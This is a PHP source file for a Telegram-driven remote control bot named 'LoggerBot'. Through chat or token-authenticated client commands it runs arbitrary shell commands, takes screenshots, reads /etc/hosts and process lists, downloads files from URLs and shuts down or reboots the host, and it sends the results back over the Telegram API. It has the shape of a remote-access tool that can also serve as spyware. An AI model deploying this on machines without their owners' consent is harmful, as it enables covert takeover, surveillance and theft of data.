<?php
require_once __DIR__ . '/Config.php';

class LoggerBot {
    private $pdo;

    public function __construct() {
        $this->initDatabase();
        $this->initDirectories();
    }

    private function initDatabase() {
        try {
            $dsn = "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4";
            $this->pdo = new PDO($dsn, Config::$DB_USER, Config::$DB_PASS);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            $this->logError("Database connection failed: " . $e->getMessage());
            die("Database connection error");
        }
    }

    private function initDirectories() {
        $dirs = [Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR, dirname(Config::$ERROR_LOG)];
        foreach ($dirs as $dir) {
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
        }
    }

    public function handleRequest() {
        // Check if it's a Telegram webhook
        if (isset($_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN']) && 
            $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] === Config::$WEBHOOK_SECRET) {
            $this->handleWebhook();
        } 
        // Check if it's a client request
        elseif (isset($_SERVER['HTTP_X_SECRET_TOKEN']) && 
                $_SERVER['HTTP_X_SECRET_TOKEN'] === Config::$SECRET_TOKEN) {
            $this->handleClientRequest();
        } else {
            http_response_code(401);
            $this->logError("Unauthorized access attempt");
            die(json_encode(['error' => 'Unauthorized']));
        }
    }

    private function handleWebhook() {
        $update = json_decode(file_get_contents('php://input'), true);
        if (!$update) {
            http_response_code(400);
            $this->logError("Invalid webhook request");
            die("Invalid request");
        }

        $this->logWebhook(json_encode($update));
        $this->processUpdate($update);
        http_response_code(200);
    }

    private function handleClientRequest() {
        $input = json_decode(file_get_contents('php://input'), true);
        if (!isset($input['command'])) {
            http_response_code(400);
            $this->logError("Invalid client request: no command provided");
            die(json_encode(['error' => 'Command required']));
        }

        $command = trim($input['command']);
        $clientId = $input['client_id'] ?? 'client';
        $this->logCommand($clientId, $command);

        $response = $this->processCommand($command, $clientId, true);
        header('Content-Type: application/json');
        echo json_encode($response);
    }

    private function processUpdate($update) {
        if (!isset($update['message'])) {
            return;
        }

        $message = $update['message'];
        $chatId = $message['chat']['id'] ?? null;
        $text = $message['text'] ?? '';
        $userId = $message['from']['id'] ?? null;

        if (!$this->isUserAuthorized($userId)) {
            $this->sendTelegramMessage($chatId, "Unauthorized access. Please contact admin.");
            return;
        }

        $this->processCommand($text, $chatId);
    }

    private function isUserAuthorized($userId) {
        if ($userId == Config::$ADMIN_CHAT_ID) {
            return true;
        }

        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE user_id = ? AND is_active = 1");
        $stmt->execute([$userId]);
        return $stmt->fetch() !== false;
    }

    private function processCommand($command, $recipient, $isClient = false) {
        $command = trim($command);
        $this->logCommand($recipient, $command);

        $response = ['status' => 'success', 'data' => ''];
        switch (true) {
            case preg_match('/^\/start$/', $command):
                $response['data'] = $this->sendWelcomeMessage($recipient, $isClient);
                break;

            case preg_match('/^\/status$/', $command):
                $response['data'] = $this->sendSystemStatus($recipient, $isClient);
                break;

            case preg_match('/^\/screenshot$/', $command):
                $response['data'] = $this->handleScreenshot($recipient, $isClient);
                break;

            case preg_match('/^\/upload (.+)/', $command, $matches):
                $response['data'] = $this->handleFileUpload($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/exec (.+)/', $command, $matches):
                $response['data'] = $this->executeCommand($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/logs$/', $command):
                $response['data'] = $this->sendLogs($recipient, $isClient);
                break;

            case preg_match('/^\/adduser (\d+)$/', $command, $matches):
                if ($recipient == Config::$ADMIN_CHAT_ID) {
                    $response['data'] = $this->addUser($recipient, $matches[1], $isClient);
                } else {
                    $response = ['status' => 'error', 'data' => 'Only admin can add users.'];
                }
                break;

            case preg_match('/^\/removeuser (\d+)$/', $command, $matches):
                if ($recipient == Config::$ADMIN_CHAT_ID) {
                    $response['data'] = $this->removeUser($recipient, $matches[1], $isClient);
                } else {
                    $response = ['status' => 'error', 'data' => 'Only admin can remove users.'];
                }
                break;

            case preg_match('/^\/listusers$/', $command):
                if ($recipient == Config::$ADMIN_CHAT_ID) {
                    $response['data'] = $this->listUsers($recipient, $isClient);
                } else {
                    $response = ['status' => 'error', 'data' => 'Only admin can list users.'];
                }
                break;

            case preg_match('/^\/hosts$/', $command):
                $response['data'] = $this->getHosts($recipient, $isClient);
                break;

            case preg_match('/^\/screens$/', $command):
                $response['data'] = $this->listScreenshots($recipient, $isClient);
                break;

            case preg_match('/^\/browse (.+)/', $command, $matches):
                $response['data'] = $this->browseDirectory($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/get-info$/', $command):
                $response['data'] = $this->getSystemInfo($recipient, $isClient);
                break;

            case preg_match('/^\/go (.+)/', $command, $matches):
                $response['data'] = $this->goToUrl($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/shutdown$/', $command):
                $response['data'] = $this->systemShutdown($recipient, $isClient);
                break;

            case preg_match('/^\/test_telegram$/', $command):
                $response['data'] = $this->testTelegram($recipient, $isClient);
                break;

            case preg_match('/^\/upload_file (.+)/', $command, $matches):
                $response['data'] = $this->handleFileUpload($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/upload_url (.+)/', $command, $matches):
                $response['data'] = $this->uploadFromUrl($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/tasks$/', $command):
                $response['data'] = $this->listTasks($recipient, $isClient);
                break;

            case preg_match('/^\/startup$/', $command):
                $response['data'] = $this->manageStartup($recipient, $isClient);
                break;

            case preg_match('/^\/signout$/', $command):
                $response['data'] = $this->signOut($recipient, $isClient);
                break;

            case preg_match('/^\/sleep$/', $command):
                $response['data'] = $this->systemSleep($recipient, $isClient);
                break;

            case preg_match('/^\/restart$/', $command):
                $response['data'] = $this->systemRestart($recipient, $isClient);
                break;

            default:
                $response['data'] = $this->sendHelpMessage($recipient, $isClient);
                break;
        }

        return $response;
    }

    private function sendTelegramMessage($chatId, $text) {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $text
        ];
        return $this->makeCurlRequest($url, $data);
    }

    private function sendTelegramFile($chatId, $filePath, $method = 'sendDocument') {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/$method";
        $data = [
            'chat_id' => $chatId,
            $method == 'sendPhoto' ? 'photo' : 'document' => new CURLFile($filePath)
        ];
        return $this->makeCurlRequest($url, $data, true);
    }

    private function makeCurlRequest($url, $data, $isFile = false) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        
        if ($isFile) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        }
        
        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            $this->logError("cURL error: " . curl_error($ch));
        }
        curl_close($ch);
        return $response;
    }

    private function sendWelcomeMessage($recipient, $isClient = false) {
        $message = "Welcome to LoggerBot!\nAvailable commands:\n" .
                  "/start - Show this message\n" .
                  "/status - System status\n" .
                  "/screenshot - Take a screenshot\n" .
                  "/upload <file_path> - Upload a file\n" .
                  "/exec <command> - Execute a system command\n" .
                  "/logs - View recent logs\n" .
                  "/hosts - View hosts file\n" .
                  "/screens - List screenshots\n" .
                  "/browse <path> - Browse directory\n" .
                  "/get-info - System information\n" .
                  "/go <url> - Open URL\n" .
                  "/shutdown - Shutdown system\n" .
                  "/test_telegram - Test Telegram connection\n" .
                  "/upload_file <file_path> - Upload a file\n" .
                  "/upload_url <url> - Upload file from URL\n" .
                  "/tasks - List running tasks\n" .
                  "/startup - Manage startup items\n" .
                  "/signout - Sign out user\n" .
                  "/sleep - Put system to sleep\n" .
                  "/restart - Restart system\n" .
                  ($recipient == Config::$ADMIN_CHAT_ID ? 
                  "/adduser <user_id> - Add a user\n" .
                  "/removeuser <user_id> - Remove a user\n" .
                  "/listusers - List all users" : "");
        
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Message sent";
    }

    private function sendSystemStatus($recipient, $isClient = false) {
        $status = [
            'uptime' => exec('uptime'),
            'disk_space' => disk_free_space(__DIR__) / disk_total_space(__DIR__) * 100,
            'memory' => memory_get_usage(true) / 1024 / 1024 . ' MB'
        ];

        $message = "System Status:\n" .
                  "Uptime: {$status['uptime']}\n" .
                  "Disk Space: " . number_format($status['disk_space'], 2) . "% free\n" .
                  "Memory Usage: {$status['memory']}";

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Status sent";
    }

    private function handleScreenshot($recipient, $isClient = false) {
        $filename = Config::$SCREENSHOT_DIR . 'screenshot_' . time() . '.png';
        $command = "scrot $filename";
        exec($command, $output, $return_var);

        if ($return_var === 0 && file_exists($filename)) {
            if ($isClient) {
                $content = base64_encode(file_get_contents($filename));
                unlink($filename);
                return ['filename' => basename($filename), 'content' => $content];
            }
            $this->sendTelegramFile($recipient, $filename, 'sendPhoto');
            unlink($filename);
            return "Screenshot sent";
        }
        $message = 'Failed to take screenshot';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function handleFileUpload($recipient, $filePath, $isClient = false) {
        $fullPath = Config::$UPLOAD_DIR . basename($filePath);
        
        if (file_exists($fullPath)) {
            if ($isClient) {
                $content = base64_encode(file_get_contents($fullPath));
                return ['filename' => basename($fullPath), 'content' => $content];
            }
            $this->sendTelegramFile($recipient, $fullPath);
            return "File uploaded";
        }
        $message = 'File not found';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function executeCommand($recipient, $command, $isClient = false) {
        $startTime = time();
        $descriptors = [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        
        $process = proc_open($command, $descriptors, $pipes);
        
        if (is_resource($process)) {
            stream_set_timeout($pipes[1], Config::$COMMAND_TIMEOUT);
            stream_set_timeout($pipes[2], Config::$COMMAND_TIMEOUT);
            
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);

            $response = empty($errors) ? $output : "Error: $errors";
            
            $encrypted = openssl_encrypt(
                $response,
                'aes-256-cbc',
                base64_decode(Config::$ENCRYPTION_KEY),
                0,
                substr(hash('sha256', Config::$SECRET_TOKEN), 0, 16)
            );

            if ($isClient) {
                return ['output' => $encrypted ?: 'Command execution failed'];
            }
            $this->sendTelegramMessage($recipient, $encrypted ?: 'Command execution failed');
            $this->logCommand($recipient, $command, $response);
            return "Command executed";
        }
        $message = 'Failed to execute command';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function sendLogs($recipient, $isClient = false) {
        $logFiles = [
            Config::$ERROR_LOG,
            Config::$WEBHOOK_LOG,
            Config::$TELEGRAM_LOG
        ];
        $results = [];

        foreach ($logFiles as $logFile) {
            if (file_exists($logFile) && filesize($logFile) <= Config::$MAX_LOG_SIZE) {
                if ($isClient) {
                    $results[] = [
                        'filename' => basename($logFile),
                        'content' => base64_encode(file_get_contents($logFile))
                    ];
                } else {
                    $this->sendTelegramFile($recipient, $logFile);
                }
            }
        }

        if ($isClient) {
            return $results ?: 'No logs available';
        }
        return "Logs sent";
    }

    private function getHosts($recipient, $isClient = false) {
        $hostsFile = '/etc/hosts'; // Adjust path based on system
        if (file_exists($hostsFile)) {
            $content = file_get_contents($hostsFile);
            if ($isClient) {
                return ['content' => $content];
            }
            $this->sendTelegramMessage($recipient, "Hosts file:\n$content");
            return "Hosts file sent";
        }
        $message = 'Hosts file not found';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function listScreenshots($recipient, $isClient = false) {
        $files = glob(Config::$SCREENSHOT_DIR . '*.png');
        $fileList = array_map('basename', $files);
        $message = "Screenshots:\n" . (empty($fileList) ? "No screenshots found" : implode("\n", $fileList));

        if ($isClient) {
            return ['files' => $fileList];
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Screenshot list sent";
    }

    private function browseDirectory($recipient, $path, $isClient = false) {
        $safePath = realpath(Config::$UPLOAD_DIR . '/' . $path);
        if ($safePath && strpos($safePath, Config::$UPLOAD_DIR) === 0 && is_dir($safePath)) {
            $files = scandir($safePath);
            $fileList = array_filter($files, fn($file) => $file !== '.' && $file !== '..');
            $message = "Directory $path:\n" . (empty($fileList) ? "Empty directory" : implode("\n", $fileList));

            if ($isClient) {
                return ['files' => $fileList];
            }
            $this->sendTelegramMessage($recipient, $message);
            return "Directory listing sent";
        }
        $message = 'Invalid or inaccessible directory';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function getSystemInfo($recipient, $isClient = false) {
        $info = [
            'os' => php_uname(),
            'php_version' => phpversion(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
            'disk_total' => disk_total_space(__DIR__) / 1024 / 1024 / 1024 . ' GB',
            'disk_free' => disk_free_space(__DIR__) / 1024 / 1024 / 1024 . ' GB'
        ];

        $message = "System Info:\n" . implode("\n", array_map(fn($k, $v) => "$k: $v", array_keys($info), $info));

        if ($isClient) {
            return $info;
        }
        $this->sendTelegramMessage($recipient, $message);
        return "System info sent";
    }

    private function goToUrl($recipient, $url, $isClient = false) {
        // Placeholder: Open URL (system-specific, e.g., using xdg-open on Linux)
        $command = "xdg-open " . escapeshellarg($url);
        exec($command, $output, $return_var);

        $message = $return_var === 0 ? "Opened URL: $url" : "Failed to open URL";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function systemShutdown($recipient, $isClient = false) {
        // Requires sudo privileges and proper configuration
        exec('sudo shutdown -h now', $output, $return_var);
        $message = $return_var === 0 ? "System shutting down" : "Failed to shutdown";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function testTelegram($recipient, $isClient = false) {
        $response = $this->makeCurlRequest("https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getMe", []);
        $message = json_decode($response, true)['ok'] ? "Telegram API is working" : "Telegram API test failed";

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function uploadFromUrl($recipient, $url, $isClient = false) {
        $filename = Config::$UPLOAD_DIR . 'downloaded_' . time() . '_' . basename($url);
        $content = file_get_contents($url);
        if ($content !== false && file_put_contents($filename, $content)) {
            if ($isClient) {
                $content = base64_encode(file_get_contents($filename));
                unlink($filename);
                return ['filename' => basename($filename), 'content' => $content];
            }
            $this->sendTelegramFile($recipient, $filename);
            unlink($filename);
            return "File uploaded from URL";
        }
        $message = "Failed to download from URL";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function listTasks($recipient, $isClient = false) {
        exec('ps aux', $output);
        $tasks = implode("\n", $output);
        $message = "Running tasks:\n" . ($tasks ?: "No tasks found");

        if ($isClient) {
            return ['tasks' => $tasks];
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Tasks listed";
    }

    private function manageStartup($recipient, $isClient = false) {
        // Placeholder: List startup items (system-specific)
        $message = "Startup management not fully implemented. Check crontab or systemd services.";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function signOut($recipient, $isClient = false) {
        // Placeholder: Sign out user (system-specific)
        $message = "Sign out not fully implemented. Requires system-specific user session management.";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function systemSleep($recipient, $isClient = false) {
        // Requires sudo privileges and proper configuration
        exec('sudo systemctl suspend', $output, $return_var);
        $message = $return_var === 0 ? "System entering sleep mode" : "Failed to enter sleep mode";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function systemRestart($recipient, $isClient = false) {
        // Requires sudo privileges and proper configuration
        exec('sudo reboot', $output, $return_var);
        $message = $return_var === 0 ? "System restarting" : "Failed to restart";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function addUser($recipient, $newUserId, $isClient = false) {
        try {
            $stmt = $this->pdo->prepare("INSERT INTO users (user_id, is_active, created_at) VALUES (?, 1, NOW())");
            $stmt->execute([$newUserId]);
            $message = "User $newUserId added successfully.";
        } catch (PDOException $e) {
            $message = "Failed to add user: " . $e->getMessage();
            $this->logError("Add user failed: " . $e->getMessage());
        }

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function removeUser($recipient, $userId, $isClient = false) {
        try {
            $stmt = $this->pdo->prepare("UPDATE users SET is_active = 0 WHERE user_id = ?");
            $stmt->execute([$userId]);
            $message = "User $userId removed successfully.";
        } catch (PDOException $e) {
            $message = "Failed to remove user: " . $e->getMessage();
            $this->logError("Remove user failed: " . $e->getMessage());
        }

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function listUsers($recipient, $isClient = false) {
        try {
            $stmt = $this->pdo->prepare("SELECT user_id FROM users WHERE is_active = 1");
            $stmt->execute();
            $users = $stmt->fetchAll();
            
            $message = "Active users:\n";
            foreach ($users as $user) {
                $message .= "- {$user['user_id']}\n";
            }
            $message = $message ?: "No active users.";
        } catch (PDOException $e) {
            $message = "Failed to list users: " . $e->getMessage();
            $this->logError("List users failed: " . $e->getMessage());
        }

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Users listed";
    }

    private function logCommand($recipient, $command, $response = '') {
        try {
            $stmt = $this->pdo->prepare(
                "INSERT INTO command_logs (chat_id, command, response, created_at) 
                VALUES (?, ?, ?, NOW())"
            );
            $stmt->execute([$recipient, $command, $response]);
        } catch (PDOException $e) {
            $this->logError("Failed to log command: " . $e->getMessage());
        }
    }

    private function logError($message) {
        $logMessage = "[" . date('Y-m-d H:i:s') . "] ERROR: $message\n";
        file_put_contents(Config::$ERROR_LOG, $logMessage, FILE_APPEND);
        $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, "Error: $message");
    }

    private function logWebhook($message) {
        $logMessage = "[" . date('Y-m-d H:i:s') . "] WEBHOOK: $message\n";
        file_put_contents(Config::$WEBHOOK_LOG, $logMessage, FILE_APPEND);
    }

    private function sendHelpMessage($recipient, $isClient = false) {
        return $this->sendWelcomeMessage($recipient, $isClient);
    }
}

// Handle request
$bot = new LoggerBot();
$bot->handleRequest();
?>